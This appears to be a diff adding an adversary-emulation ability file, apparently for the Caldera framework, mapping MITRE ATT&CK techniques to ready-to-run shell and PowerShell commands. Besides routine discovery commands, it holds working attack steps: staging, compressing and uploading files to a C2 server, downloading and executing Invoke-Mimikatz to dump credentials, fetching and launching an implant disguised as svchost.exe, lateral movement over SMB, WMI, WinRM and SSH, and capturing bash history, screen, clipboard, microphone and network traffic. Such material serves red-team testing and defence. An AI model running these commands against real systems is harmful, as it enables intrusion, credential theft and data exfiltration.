+   - sh:
+     platform: linux
+     command: |
+       whoami
+   - psh:
+     platform: windows
+     command: |
+       $env:username
+   - cmd:
+     platform: windows
+     command: |
+       echo %username%
+ c1cd6388-3ced-48c7-a511-0434c6ba8f48:
+  name:  Find local users
+  tactic:  discovery
+  technique_name:  "Account Discovery: Local Account"
+  technique_id:  T1087.001
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'
+   - sh:
+     platform: linux
+     command: |
+       cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'
+ feaced8f-f43f-452a-9500-a5219488abb8:
+  name:  Identify local users
+  tactic:  discovery
+  technique_name:  "Account Discovery: Local Account"
+  technique_id:  T1087.001
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       dscl . list /Users | grep -v '_'
+   - psh:
+     platform: windows
+     command: |
+       Get-WmiObject -Class Win32_UserAccount
+ b6f545ef-f802-4537-b59d-2cb19831c8ed:
+  name:  Snag broadcast IP
+  tactic:  discovery
+  technique_name:  "System Network Configuration Discovery"
+  technique_id:  T1016
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       ifconfig | grep broadcast
+ 3b5db901-2cb8-4df7-8043-c4628a6a5d5a:
+  name:  Find user processes
+  tactic:  discovery
+  technique_name:  "Process Discovery"
+  technique_id:  T1057
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       ps aux | grep #{host.user.name}
+   - sh:
+     platform: linux
+     command: |
+       ps aux | grep #{host.user.name}
+   - psh:
+     platform: windows
+     command: |
+       $owners = @{};
+       gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};
+       $ps = get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}};
+       foreach($p in $ps) {
+           if($p.Owner -eq "#{host.user.name}") {
+               $p;
+           }
+       }
+ 530e47c6-8592-42bf-91df-c59ffbd8541b:
+  name:  View admin shares
+  tactic:  discovery
+  technique_name:  "Network Share Discovery"
+  technique_id:  T1135
+  executors: 
+   - pwsh:
+     platform: windows
+     command: |
+       Get-SmbShare | ConvertTo-Json
+   - psh:
+     platform: windows
+     command: |
+       Get-SmbShare | ConvertTo-Json
+ 26c8b8b5-7b5b-4de1-a128-7d37fb14f517:
+  name:  Discover domain controller
+  tactic:  discovery
+  technique_name:  "Remote System Discovery"
+  technique_id:  T1018
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       nltest /dsgetdc:%USERDOMAIN%
+   - psh:
+     platform: windows
+     command: |
+       nltest /dsgetdc:$env:USERDOMAIN
+ 2dece965-37a0-4f70-a391-0f30e3331aba:
+  name:  Discover antivirus programs
+  tactic:  discovery
+  technique_name:  "Software Discovery: Security Software Discovery"
+  technique_id:  T1518.001
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       find /Applications/ -maxdepth 2 -iname *.app | grep -io "[a-z ]*\.app" | grep -Ei -- "symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)"
+   - psh:
+     platform: windows
+     command: |
+       wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value
+ 5c4dd985-89e3-4590-9b57-71fed66ff4e2:
+  name:  Permission Groups Discovery
+  tactic:  discovery
+  technique_name:  "Permission Groups Discovery: Local Groups"
+  technique_id:  T1069.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       gpresult /R
+   - sh:
+     platform: darwin
+     command: |
+       groups
+   - sh:
+     platform: linux
+     command: |
+       groups
+ 8c06ebf8-bacf-486b-bd77-21ba8c5a5777:
+  name:  Identify Firewalls
+  tactic:  discovery
+  technique_name:  "Software Discovery: Security Software Discovery"
+  technique_id:  T1518.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $NameSpace = Get-WmiObject -Namespace "root" -Class "__Namespace" | Select Name | Out-String -Stream | Select-String "SecurityCenter";
+       $SecurityCenter = $NameSpace | Select-Object -First 1;
+       Get-WmiObject -Namespace "root\$SecurityCenter" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;
+ ce485320-41a4-42e8-a510-f5a8fe96a644:
+  name:  Discover Mail Server
+  tactic:  discovery
+  technique_name:  "Remote System Discovery"
+  technique_id:  T1018
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       host "#{target.org.domain}" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev
+   - sh:
+     platform: darwin
+     command: |
+       host "#{target.org.domain}" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev
+   - psh:
+     platform: windows
+     command: |
+       (nslookup -querytype=mx #{target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()
+ b007fc38-9eb7-4320-92b3-9a3ad3e6ec25:
+  name:  Get Chrome Bookmarks
+  tactic:  discovery
+  technique_name:  "Browser Bookmark Discovery"
+  technique_id:  T1217
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       cat ~/Library/Application\ Support/Google/Chrome/Default/Bookmarks
+ 4e97e699-93d7-4040-b5a3-2e906a58199e:
+  name:  Stage sensitive files
+  tactic:  collection
+  technique_name:  "Data Staged: Local Data Staging"
+  technique_id:  T1074.001
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}
+   - sh:
+     platform: linux
+     command: |
+       cp #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}
+   - psh:
+     platform: windows
+     command: |
+       Copy-Item #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}
+   - cmd:
+     platform: windows
+     command: |
+       copy #{host.file.path[filters(technique=T1005,max=3)]} #{host.dir.staged[filters(max=1)]}
+ 300157e5-f4ad-4569-b533-9d1fa0e74d74:
+  name:  Compress staged directory
+  tactic:  exfiltration
+  technique_name:  "Archive Collected Data: Archive via Utility"
+  technique_id:  T1560.001
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz
+   - sh:
+     platform: linux
+     command: |
+       tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz
+   - psh:
+     platform: windows
+     command: |
+       Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;
+       sleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select
+   - pwsh:
+     platform: windows
+     command: |
+       Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;
+       sleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select
+ ea713bc4-63f0-491c-9a6f-0b01d560b87e:
+  name:  Exfil staged directory
+  tactic:  exfiltration
+  technique_name:  "Exfiltration Over C2 Channel"
+  technique_id:  T1041
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
+   - sh:
+     platform: linux
+     command: |
+       curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
+   - psh:
+     platform: windows
+     command: |
+       $ErrorActionPreference = 'Stop';
+       $fieldName = "#{host.dir.compress}";
+       $filePath = "#{host.dir.compress}";
+       $url = "#{server}/file/upload";
+       
+       Add-Type -AssemblyName 'System.Net.Http';
+       
+       $client = New-Object System.Net.Http.HttpClient;
+       $content = New-Object System.Net.Http.MultipartFormDataContent;
+       $fileStream = [System.IO.File]::OpenRead($filePath);
+       $fileName = [System.IO.Path]::GetFileName($filePath);
+       $fileContent = New-Object System.Net.Http.StreamContent($fileStream);
+       $content.Add($fileContent, $fieldName, $fileName);
+       $client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-#{paw}');
+       $client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
+       
+       $result = $client.PostAsync($url, $content).Result;
+       $result.EnsureSuccessStatusCode();
+   - pwsh:
+     platform: windows
+     command: |
+       $ErrorActionPreference = 'Stop';
+       $fieldName = "#{host.dir.compress}";
+       $filePath = "#{host.dir.compress}";
+       $url = "#{server}/file/upload";
+       
+       Add-Type -AssemblyName 'System.Net.Http';
+       
+       $client = New-Object System.Net.Http.HttpClient;
+       $content = New-Object System.Net.Http.MultipartFormDataContent;
+       $fileStream = [System.IO.File]::OpenRead($filePath);
+       $fileName = [System.IO.Path]::GetFileName($filePath);
+       $fileContent = New-Object System.Net.Http.StreamContent($fileStream);
+       $content.Add($fileContent, $fieldName, $fileName);
+       $client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-#{paw}');
+       $client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
+       
+       $result = $client.PostAsync($url, $content).Result;
+       $result.EnsureSuccessStatusCode();
+
+ 316251ed-6a28-4013-812b-ddf5b5b007f8:
+  name:  Screen Capture
+  tactic:  collection
+  technique_name:  "Screen Capture"
+  technique_id:  T1113
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       for i in {1..5}; do screencapture -t png screen-$i.png; echo "$(cd "$(dirname "$1")"; pwd -P)/$(basename "screen-$i.png")"; sleep 5; done;
+   - psh:
+     platform: windows
+     command: |
+       $loadResult = [Reflection.Assembly]::LoadWithPartialName("System.Drawing");
+       function screenshot([Drawing.Rectangle]$bounds, $path) {
+          $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;
+          $graphics = [Drawing.Graphics]::FromImage($bmp);
+          $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);
+          $bmp.Save($path);
+          $graphics.Dispose();
+          $bmp.Dispose();
+       }
+       if ($loadResult) {
+         $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);
+         $dest = "$HOME\Desktop\screenshot.png";
+         screenshot $bounds $dest;
+         if (Test-Path -Path $dest) {
+           $dest;
+           exit 0;
+         };
+       };
+       exit 1;
+   - pwsh:
+     platform: windows
+     command: |
+       $loadResult = [Reflection.Assembly]::LoadWithPartialName("System.Drawing");
+       function screenshot([Drawing.Rectangle]$bounds, $path) {
+          $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height;
+          $graphics = [Drawing.Graphics]::FromImage($bmp);
+          $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);
+          $bmp.Save($path);
+          $graphics.Dispose();
+          $bmp.Dispose();
+       }
+       if ($loadResult) {
+         $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900);
+         $dest = "$HOME\Desktop\screenshot.png";
+         screenshot $bounds $dest;
+         if (Test-Path -Path $dest) {
+           $dest;
+           exit 0;
+         };
+       };
+       exit 1;
+ b007fe0c-c6b0-4fda-915c-255bbc070de2:
+  name:  Copy Clipboard
+  tactic:  collection
+  technique_name:  "Clipboard Data"
+  technique_id:  T1115
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       pbpaste
+   - psh:
+     platform: windows
+     command: |
+       Get-Clipboard -raw
+   - pwsh:
+     platform: windows
+     command: |
+       Get-Clipboard -raw
+   - sh:
+     platform: linux
+     command: |
+       xclip -o
+ 78524da1-f347-4fbb-9295-209f1f408330:
+  name:  Record microphone
+  tactic:  impact
+  technique_name:  "Resource Hijacking"
+  technique_id:  T1496
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       brew install sox >/dev/null 2>&1;
+       sox -d recording.wav trim 0 15 >/dev/null 2>&1;
+ 9a30740d-3aa8-4c23-8efa-d51215e8a5b9:
+  name:  Scan WIFI networks
+  tactic:  discovery
+  technique_name:  "System Network Configuration Discovery"
+  technique_id:  T1016
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       ./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan
+   - sh:
+     platform: linux
+     command: |
+       ./#{payload:9f639067-370a-40ba-b7ac-6f1c15d5a158} scan
+   - psh:
+     platform: windows
+     command: |
+       .\#{payload:28f9bf43-4f14-4965-9bd9-b70fd6993d8e} -Scan
+ a0676fe1-cd52-482e-8dde-349b73f9aa69:
+  name:  Preferred WIFI
+  tactic:  discovery
+  technique_name:  "System Network Configuration Discovery"
+  technique_id:  T1016
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       ./wifi.sh pref
+   - sh:
+     platform: linux
+     command: |
+       ./wifi.sh pref
+   - psh:
+     platform: windows
+     command: |
+       .\wifi.ps1 -Pref
+ 1b4fb81c-8090-426c-93ab-0a633e7a16a7:
+  name:  Sniff network traffic
+  tactic:  credential-access
+  technique_name:  "Network Sniffing"
+  technique_id:  T1040
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $path = "$ENV:UserProfile\Desktop\pcap.etl";
+       New-NetEventSession -Name "PCAP" -CaptureMode SaveToFile -LocalFilePath $path;
+       Add-NetEventProvider -Name "Microsoft-Windows-TCPIP" -SessionName "PCAP";
+       Start-NetEventSession -Name "PCAP";
+       Start-Sleep -s 60;
+       Stop-NetEventSession -Name "PCAP";
+       if (Test-Path $path) {
+         echo $path;
+         exit 0;
+       } else {
+         echo "Failed to generate PCAP file.";
+         exit 1;
+       };
+   - sh:
+     platform: darwin
+     command: |
+       tcpdump -i en0 & sleep 5; kill $!
+ de52784d-4de6-4d4e-b79e-e7b68fe037fb:
+  name:  Add bookmark
+  tactic:  execution
+  technique_name:  "Command and Scripting Interpreter: AppleScript"
+  technique_id:  T1059.002
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       osascript bookmark.scpt #{host.chrome.bookmark_title[filters(max=1)]} #{server.malicious.url[filters(max=1)]}
+ 356d1722-7784-40c4-822b-0cf864b0b36d:
+  name:  Manx
+  tactic:  command-and-control
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       server="#{app.contact.http}";
+       socket="#{app.contact.tcp}";
+       contact="tcp";
+       curl -s -X POST -H "file:manx.go" -H "platform:darwin" $server/file/download > #{agents.implant_name};
+       chmod +x #{agents.implant_name};
+       ./#{agents.implant_name} -http $server -socket $socket -contact $contact -v
+   - sh:
+     platform: linux
+     command: |
+       server="#{app.contact.http}";
+       socket="#{app.contact.tcp}";
+       contact="tcp";
+       curl -s -X POST -H "file:manx.go" -H "platform:linux" $server/file/download > #{agents.implant_name};
+       chmod +x #{agents.implant_name};
+       ./#{agents.implant_name} -http $server -socket $socket -contact $contact -v
+   - psh:
+     platform: windows
+     command: |
+       if ($host.Version.Major -ge 3){$ErrAction= "ignore"}else{$ErrAction= "SilentlyContinue"};
+       $server="#{app.contact.http}";
+       $socket="#{app.contact.tcp}";
+       $contact="tcp";
+       $url="$server/file/download";
+       $wc=New-Object System.Net.WebClient;
+       $wc.Headers.add("platform","windows");
+       $wc.Headers.add("file","manx.go");
+       $data=$wc.DownloadData($url);
+       Get-Process | ? {$_.Path -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f -ea $ErrAction;
+       rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea $ErrAction;
+       ([io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data)) | Out-Null;
+       Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-socket $socket -http $server -contact $contact" -WindowStyle hidden;
+ 02de522f-7e0a-4544-8afc-0c195f400f5f:
+  name:  Parse SSH config
+  tactic:  collection
+  technique_name:  "Data from Local System"
+  technique_id:  T1005
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       pip install stormssh && storm list
+   - sh:
+     platform: linux
+     command: |
+       pip install -q stormssh 2> /dev/null && storm list | sed 's/\x1b\[[0-9;]*m//g'
+ 422526ec-27e9-429a-995b-c686a29561a4:
+  name:  Dump history
+  tactic:  credential-access
+  technique_name:  "Unsecured Credentials: Bash History"
+  technique_id:  T1552.003
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       find ~/.bash_sessions -name '*' -exec cat {} \; 2>/dev/null
+   - sh:
+     platform: linux
+     command: |
+       cat ~/.bash_history
+ 85341c8c-4ecb-4579-8f53-43e3e91d7617:
+  name:  Collect ARP details
+  tactic:  discovery
+  technique_name:  "Remote System Discovery"
+  technique_id:  T1018
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       arp -a
+   - sh:
+     platform: linux
+     command: |
+       arp -a
+   - psh:
+     platform: windows
+     command: |
+       arp -a
+   - cmd:
+     platform: windows
+     command: |
+       arp -a
+ baac2c6d-4652-4b7e-ab0a-f1bf246edd12:
+  name:  Run PowerKatz
+  tactic:  credential-access
+  technique_name:  "OS Credential Dumping: LSASS Memory"
+  technique_id:  T1003.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
+       $web = (New-Object System.Net.WebClient);
+       $result = $web.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1");
+       iex $result; Invoke-Mimikatz -DumpCreds
+ fdf8bf36-797f-4157-805b-fe7c1c6fc903:
+  name:  Find Hostname
+  tactic:  discovery
+  technique_name:  "Remote System Discovery"
+  technique_id:  T1018
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       nbtstat -A #{remote.host.ip}
+ fa4ed735-7006-4451-a578-b516f80e559f:
+  name:  Reverse nslookup IP
+  tactic:  discovery
+  technique_name:  "Remote System Discovery"
+  technique_id:  T1018
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       nslookup #{remote.host.ip}
+ aa6ec4dd-db09-4925-b9b9-43adeb154686:
+  name:  Mount Share
+  tactic:  lateral-movement
+  technique_name:  "Remote Services: SMB/Windows Admin Shares"
+  technique_id:  T1021.002
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       net use \\#{remote.host.fqdn}\C$ /user:#{domain.user.name} #{domain.user.password}
+ 65048ec1-f7ca-49d3-9410-10813e472b30:
+  name:  Copy 54ndc47 (SMB)
+  tactic:  lateral-movement
+  technique_name:  "Remote Services: SMB/Windows Admin Shares"
+  technique_id:  T1021.002
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $path = "sandcat.go-windows";
+       $drive = "\\#{remote.host.fqdn}\C$";
+       Copy-Item -v -Path $path -Destination $drive"\Users\Public\s4ndc4t.exe";
+ 4908fdc4-74fc-4d7c-8935-26d11ad26a8d:
+  name:  Copy 54ndc47 (WinRM and SCP)
+  tactic:  lateral-movement
+  technique_name:  "Lateral Tool Transfer"
+  technique_id:  T1570
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $job = Start-Job -ScriptBlock {
+         $username = "#{domain.user.name}";
+         $password = "#{domain.user.password}";
+         $secstr = New-Object -TypeName System.Security.SecureString;
+         $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
+         $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
+         $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;
+         $location = "#{location}";
+         $exe = "#{exe_name}";
+         Copy-Item $location -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
+         Start-Sleep -s 5;
+         Remove-PSSession -Session $session;
+       };
+       Receive-Job -Job $job -Wait;
+   - pwsh:
+     platform: windows
+     command: |
+       $job = Start-Job -ScriptBlock {
+         $username = "#{domain.user.name}";
+         $password = "#{domain.user.password}";
+         $secstr = New-Object -TypeName System.Security.SecureString;
+         $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
+         $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
+         $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;
+         $location = "#{location}";
+         $exe = "#{exe_name}";
+         Copy-Item $location -Destination "C:\Users\Public\svchost.exe" -ToSession $session;
+         Start-Sleep -s 5;
+         Remove-PSSession -Session $session;
+       };
+       Receive-Job -Job $job -Wait;
+   - sh:
+     platform: darwin
+     command: |
+       scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go
+   - sh:
+     platform: linux
+     command: |
+       scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go
+ ece5dde3-d370-4c20-b213-a1f424aa8d03:
+  name:  Start 54ndc47 (WMI)
+  tactic:  execution
+  technique_name:  "Windows Management Instrumentation"
+  technique_id:  T1047
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $node = '''#{remote.host.fqdn}''';
+       $user = '''#{domain.user.name}''';
+       $password = '''#{domain.user.password}''';
+       wmic /node:$node /user:$user /password:$password process call create "powershell.exe C:\Users\Public\s4ndc4t.exe -server #{server} -group #{group}";
+   - cmd:
+     platform: windows
+     command: |
+       $node = '''#{remote.host.fqdn}''';
+       $user = '''#{domain.user.name}''';
+       $password = '''#{domain.user.password}''';
+       wmic /node:$node /user:$user /password:$password process call create "cmd.exe C:\Users\Public\s4ndc4t.exe -server #{server} -group #{group}";
+ 41bb2b7a-75af-49fd-bd15-6c827df25921:
+  name:  Start Agent (WinRM)
+  tactic:  lateral-movement
+  technique_name:  "Remote Services: Windows Remote Management"
+  technique_id:  T1021.006
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $username = "#{domain.user.name}";
+       $password = "#{domain.user.password}";
+       $secstr = New-Object -TypeName System.Security.SecureString;
+       $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};
+       $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;
+       $session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;
+       Invoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\Users\Public\svchost.exe -server #{server} }};
+       Start-Sleep -s 5;
+       Remove-PSSession -Session $session;
+ 10a9d979-e342-418a-a9b0-002c483e0fa6:
+  name:  Start 54ndc47
+  tactic:  lateral-movement
+  technique_name:  "Remote Services: SSH"
+  technique_id:  T1021.004
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go &&
+       ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'
+   - sh:
+     platform: linux
+     command: |
+       scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&
+       ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'
